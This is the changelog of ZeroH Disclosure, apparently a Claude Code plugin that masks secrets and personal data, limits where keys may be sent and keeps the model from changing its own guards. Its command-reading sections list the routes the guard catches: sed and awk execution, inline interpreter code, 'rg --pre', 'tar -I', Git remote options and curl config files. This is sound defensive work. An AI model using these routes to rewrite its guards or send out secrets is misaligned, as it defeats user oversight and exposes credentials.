With your first message after the install, ZeroH adds one line under Claude Code's prompt, unless
you have a status line of your own, and says so:
`🛡️ ZeroH · 🟢 protected · 4 masked · 0 sent · unmask EMAIL 12m · receipt ↗`. 🟢 means the hooks
work and the proxy masks what you type; 🟡 names what is only partly protected and the fix
(`files only`, `proxy starts with your first prompt`, `proxy down`, `starting`,
`N not protected this turn`); 🔴 names why nothing is protected (`hooks failing`, `hooks stopped`,
`hooks never ran`, `vault can't be opened`, `plugin disabled`, `not installed`). `receipt ↗` is a
terminal link to the session's receipt. It reads a small `status.json` and heartbeat the hooks
keep per session, with no network call, and never shows a value.

- The entry (in the README) is one `node -e` command that finds the installed plugin itself,
  survives plugin updates, runs in Bash, Git Bash and both PowerShells, and runs only a plugin copy
  Claude Code lists as installed or keeps in its cache.
- ZeroH records your choice per settings file: `/zeroh-disclosure:settings statusline off` or
  deleting it with `/statusline` is never undone; your own status line is never replaced (the
  `segment` command adds ZeroH's part to it). Uninstall removes the entry from every file it was
  written to.
- Make it yours: Claude can change how it looks when you ask (fields, order, separator, labels,
  emoji, compact wording, colour, "only when something is wrong") through
  `statusline-style.json`, the one ZeroH file it may edit. The state and its fix always show while
  ZeroH isn't 🟢, and labels can't fake a state. `zeroh-disclosure statusline --json` gives the
  state as versioned data (`zeroh-statusline/1`) for a status line of your own, and
  `/zeroh-disclosure:settings statusline style` shows where the style lives. See
  [docs/statusline.md](docs/statusline.md).
- The first message also turns on auto-update for the zeroh marketplace, unless you set it either
  way, once.
- The install prompt is one line: `Install ZeroH Disclosure for me by following
https://github.com/Blade-Labs/zeroh-marketplace`. The marketplace's README carries every step
  Claude needs (Node.js check, the two commands, what to tell the user), so it reads one page.
- The settings guard stops the model adding, changing or removing any `statusLine`, and changing
  the `env` keys hooks run under (`PATH`, `NODE_OPTIONS`, `HOME`, `CLAUDE_CONFIG_DIR`, …).
- The uninstall tombstone moved from the shared temporary folder into ZeroH's own folder, where
  no other local user can plant it.
- Only a status line command ZeroH wrote, complete, counts as ZeroH's: a status line of your own
  that runs ZeroH's segment (`zeroh=$(… segment); printf …`) is never replaced or removed. The
  first-message setup is recorded only once the settings file is written, so a write that fails is
  tried again at the next prompt. `statusline-style.json` stays editable only as a plain file: a
  link in its place, even a broken one, is protected like the rest of ZeroH's folder.
- The Stop line, the status line, the receipt and `/zeroh-disclosure:report` no longer count a
  prompt that was sent unmasked (no proxy) or stopped as masked, or say Claude saw its token; they
  read what happened from the signed receipt, so a finalised turn is counted the same way. The
  report's "prompts stopped" now counts finalised turns too.

### Commands ZeroH reads more precisely

- One shell tokenizer, checked against real bash, reads quoting, escapes, `$'…'`, heredocs and
  launchers (`env`, `timeout`, `sudo`, `nohup`, `xargs`, absolute paths) before any check, for both
  the settings guard and the destination check. `rg --pre` against ZeroH's or Claude's files is
  refused in every spelling; reading those files with any command is fine.
- Destinations are read across the whole command, with no length limit; a network command's
  operand is a host whatever it looks like, and a dotted word counts as a file only if it exists.
- Options are read once, as the program reads them, for both checks: clustered and attached short
  options, `--option=value`, GNU long-option abbreviations and each program's own optional values
  mean the same as the spelled-out form (`curl -sKconfig.txt` is `curl -K config.txt`,
  `python3 -c'…'` is `python3 -c '…'`, `perl -le'…'` is `perl -l -e '…'`, `sed --expr=…` is
  `sed --expression=…`).
- Writing, deleting or running Claude Code's settings or ZeroH's hooks is stopped when ZeroH reads
  it in the command: inline Python, Node, Perl, Ruby, PHP or Lua code whose write, delete or
  command call names one of those files (each language's calls are read, strings and comments
  aside), sed (`w`, `W`, `s///w`, `e`) and awk (output redirection, pipes, `system()`, with its
  continuations, regex literals and variables read). Reading them this way runs as before. A
  program that names one of those files but whose effect ZeroH can't read (a `$SCRIPT`, `-f
file`, code that picks the file or the call at run time) runs with a "not protected" line, and
  is denied with `uncertain block`.
- A restored value given to a sourced script (`source`, `.`), to a Git command that talks to a
  remote (`push`, `fetch`, `pull`, `clone`, `ls-remote`, …, whose destination comes from the
  repository's configuration), to a Git alias, or to sed's `e` command runs with a "not protected"
  line, and is stopped in `uncertain block` mode before it is restored. A Git URL on the line is
  checked like any other host; local Git commands stay local.
- `gh` goes to the GitHub host named on the line (`--hostname`, a URL, `-R host/owner/repo`,
  `GH_HOST=`; `github.com` also means `api.github.com`), checked like any host; without one the
  host comes from gh's configuration and the command runs with a "not protected" line. `openssl
s_client`, `s_time`, `ocsp` and `cmp` are checked against the host they connect to, and an openssl
  subcommand ZeroH doesn't know is not taken as local. A Git `-c` that names a program
  (`core.sshCommand`) is a script whatever the remote, `git remote add -f` fetches, and
  `gh extension exec` runs a local program. Local uses
  (`gh --version`, `gh config`, `openssl rand`, `openssl x509`) stay local. Options of local
  programs that reach another machine or run a program (a `host:path` tar archive, `tar -I`,
  `rg --pre`, `sort --compress-program`, `zip -TT`, `less +!…`, a UNC path) are treated the same
  way; in PowerShell a UNC path's host is the destination.

### Changes to ZeroH's own protection

- **Management commands are applied on your own typed prompt.** `/zeroh-disclosure:proxy off|on`,
  `:allow` (and `--remove`), `:doctor --fix`, `:uninstall --yes`, `:unmask caps` and the
  `:settings` changes now finish on the same turn: the command's `!` block only records the
  request, and ZeroH applies it when it checks the prompt you typed. The result appears at once,
  starting with `✓ Done by ZeroH Disclosure (your command ran here and was not sent to Claude):`,
  under Claude Code's "operation blocked by hook" label; nothing is sent to the model.
- **The command-line tool refuses these changes for anyone but you.** Run by Claude through Bash,
  PowerShell or Monitor, under any name, launcher or quoting, it changes nothing and answers
  `Nothing changed: <action> changes what ZeroH Disclosure protects, so only you can do it.` with
  the slash command and terminal command to use. In a terminal outside Claude Code it shows the
  exact action and asks you to type a one-time four-character code; the recovery commands
  (`doctor --fix`, `proxy off`, `uninstall --yes`) keep working there.
- `vault clear` now always needs `--yes`, and `uninstall` without `--yes` only shows what it would
  remove, in a terminal too; the typed "yes" prompts are replaced by the code.
- **New setting `ZEROH_UNCERTAIN`** (`/zeroh-disclosure:settings uncertain pass|block`): `pass`, the
  default, never stops ordinary work and restores as before when a destination can't be proven;
  `block` denies such uncertain cases. A repository's `.zeroh.env` may only set it to `block`.

## 1.0.0-rc.1

The first public release: the free tier of ZeroH Disclosure, working in Claude Code on macOS,
Linux and Windows.

### Masking and restore

- **What you type is masked, not just blocked.** A local proxy, on by default, masks every request
  on its way to the model: typed text, `CLAUDE.md`, memory and tool results. It needs no
  administrator rights and survives a reboot through a per-user login item. It protects the first
  session from its first prompt, with no restart; a secret in the prompt that switches the session
  to the proxy is stopped. Without the proxy, a prompt with a secret is stopped, says why in three
  plain lines, and a masked copy goes to your clipboard; the prompt is never repeated.
- **File contents and command output reach the model as tokens** (`[TYPE-xxxxxx]`). Real values go
  back only into commands on your machine, through a short-lived private file, and never into the
  command text that the model or the transcript sees. A command that can't be rewritten safely is
  denied.
- **Keys reach only their allowed hosts**, including hosts written without `https://` and IP
  addresses. Only you can allow a new host (`/zeroh-disclosure:allow`), and the model can't change
  ZeroH's settings, its allow list or its own plugin files, or run the commands that change them.
  `/zeroh-disclosure:allow` alone shows where each known value may go and why. An MCP server gets
  a real value only when you allow it (`mcp:<server>`).
- **Real values on your screen.** Claude's answers show the real values; the model and the saved
  conversation keep tokens. When Claude names a token itself it writes `⟦TYPE-xxxxxx⟧`, which is
  never replaced.
- **Timed unmask of personal data.** Claude can ask to see one kind of personal data (for example
  `EMAIL`) for 15 minutes, an hour or the session; you decide in Claude Code's own dialog, within
  caps you set. Tell Claude to stop and it ends the unmask at once. Keys are never unmasked.

### Detection

- **Detection by pattern and exact value:** about 220 provider key formats from the gitleaks rule
  set, secrets next to key-like names, values from your `.env` and credential files (also when
  encoded), and 33 kinds of personal data. A random-looking value next to a key-like name
  (`AUTH_TOKEN=…`) is masked; a random value with no name, in what you type, gets a warning. A
  quoted value next to such a name is masked whole unless all of it is a reference, a complete CSS
  value or a label (`"Enter your password"`): a password with a CSS call or a template in it, or a
  passphrase that includes the word "secret", is masked.
- **Personal data is decided by maintained libraries, vendored in the plugin** (no install, no
  runtime dependency): validator.js 13.15.35 for email addresses (with IANA's top-level domains),
  card numbers, IBANs, IP addresses, passports, crypto addresses and several national IDs, and
  libphonenumber-js 1.13.14 (Google's metadata) for phone numbers. Whole addresses are masked,
  including apostrophes, `+` tags, non-ASCII letters, quoted local parts and IP literals.
- **National IDs and tax numbers from 21 countries**, each decided by a vendored validator or a
  published rule: US SSNs and ITINs, UK National Insurance numbers, Qatar IDs, Spanish, Italian
  and Finnish IDs, Aadhaar, PAN, CNIC, Emirates ID, Saudi national ID and iqama, CPF, PESEL,
  personnummer, BSN, fødselsnummer, Thai, Israeli, Chinese, Taiwanese and Hong Kong IDs, and
  Malaysian NRIC, plus dates of birth. A number that is only digits counts next to a word naming
  it, a key such as `"ssn":`, or its CSV column header
  ([What ZeroH Disclosure detects](docs/detection.md)).
- **Formats:** text PDFs and notebooks are masked. Images and scanned PDFs pass with a one-line
  notice. Names and currency amounts are left to context-aware detection, planned for Premium.
- **One detection engine for Blade Labs.** The detection rules and their vendored libraries are
  now the MIT-licensed `@bladelabs/sensitive-data-detectors` package from the Blade Labs monorepo,
  shipped as a synced copy in `vendor/sensitive-data-detectors` (still nothing to install). What
  is detected is unchanged.
- **Report a miss.** `/zeroh-disclosure:report-miss` takes a value ZeroH did not mask through a
  private dialog, masks it from then on and keeps a shape-only report on your machine. Sending
  reports to Blade Labs comes in 1.1.

### Receipts

- **Receipts as a till slip.** Every turn gets a receipt signed on your laptop (ECDSA P-256),
  recording what the hooks did. `/zeroh-disclosure:mask-receipt`, `/zeroh-disclosure:report` and
  `receipt.html` show what was withheld, what was sent, and whether every receipt verified;
  `/zeroh-disclosure:mask-show` shows which tokens the model saw.
- **Nothing in your projects.** Receipts, turn records and allow rules live in ZeroH's own folder,
  `~/.zeroh/projects/<project>/` (`%LOCALAPPDATA%\ZeroH` on Windows). Receipts are kept for 90
  days by default (`/zeroh-disclosure:settings receipts keep`, `ZEROH_RECEIPT_RETENTION`; a
  repository may only shorten it) and contain no values.
- **A vault you can inspect:** detected values expire after 7 days without use (or per session,
  or after 30 days). `/zeroh-disclosure:settings vault status` shows counts and ages, never
  values, and `vault clear --yes` empties it.

### Everyday use

- **Everything from inside Claude Code.** Every action is a slash command: `:status`, `:allow`,
  `:unmask`, `:report`, `:proxy`, `:doctor`, `:settings` and `:uninstall`. Messages that point to
  a fix name the slash command first and, for when Claude Code can't start, the exact terminal
  command with the plugin's path filled in.
- **Ask Claude about ZeroH.** The `about` skill answers what ZeroH protects and doesn't, how it
  works and what Free and Premium include, from the live rule set.
- **A banner at session start** with the protection status; `/zeroh-disclosure:status` shows it in
  full, and `/zeroh-disclosure:settings banner full|compact|off` sets how much you see.
- **Uninstall is one command and complete.** `/zeroh-disclosure:uninstall --yes` removes the
  plugin from Claude Code first (`claude plugin uninstall`), then the proxy, its settings entry
  and login item, and ZeroH's folder. It never deletes a folder that isn't ZeroH's. Sessions still
  open do nothing more until you exit them.

### Reliability and safety

- **Never blocks Claude Code.** An error the local proxy produces is a plain, non-retryable
  message; network failures are retried by Claude Code as without ZeroH; a proxy that stopped is
  restarted within three seconds, or you get one clear "restart Claude Code" notice, and typed
  secrets are stopped rather than sent. `/zeroh-disclosure:doctor --fix` is the one recovery,
  including for a build before 1.0, and `doctor --report` prints a paste-safe summary of the local
  diagnostic reports, which never leave your machine.
- **Fails closed on errors it can see:** if ZeroH can't open its vault or a hook fails while it
  loads or runs, output is withheld, the call is denied or the prompt is stopped, rather than raw
  content passing through. Commands that time out or are interrupted are the exception
  (README, "Guarantees and limits").
- **A repository can't weaken ZeroH:** a project's `.zeroh.env` may only change display settings
  and retention, or tighten a protection.
- **Proxy lifecycle.** The proxy uses your corporate `HTTPS_PROXY`, `NO_PROXY` and
  `NODE_EXTRA_CA_CERTS`, also after a reboot, and drops a recorded network proxy it can't reach.
  It restarts itself with new code after a plugin update, and takes its settings entry with it
  when it stops, except where a running session uses it. `proxy off` stays off until `proxy on`.
  On a machine that refuses login items it is not used, so no session meets a dead port. Sessions
  in a project where the plugin is disabled pass through unmasked while no ZeroH session runs, and
  are masked while one does.
- **Vault safety.** The vault key is created atomically; `doctor --fix`, from any folder, resets
  every vault that can't be read and says which project, deleting the old files unless
  `--keep-backups`; a vault that can't be read for a permission or a lock is left alone, and a
  newer vault format is never overwritten.
- **Windows:** commands run through Git Bash or Claude Code's PowerShell tool; the slash commands
  need one of them as the default shell. ZeroH's folder is `%LOCALAPPDATA%\ZeroH`, limited to your
  account, and the proxy starts at logon without a console window.
- Hooks on a Node.js older than 20 say so once and step aside.
- The unit tests run with `npm test` and need only Node.js.

## 0.2.0

- Tool output masked before the model reads it.
- Real values restored on your machine for allowed hosts.
- Real values shown on your screen while the transcript keeps tokens.
- An opt-in local masking proxy.
- Hooks rebuilt on Node.js built-ins.

## 0.1.1

- Prompts that contain a secret are stopped before they are sent, and a masked copy is offered.
- Signed local receipts.
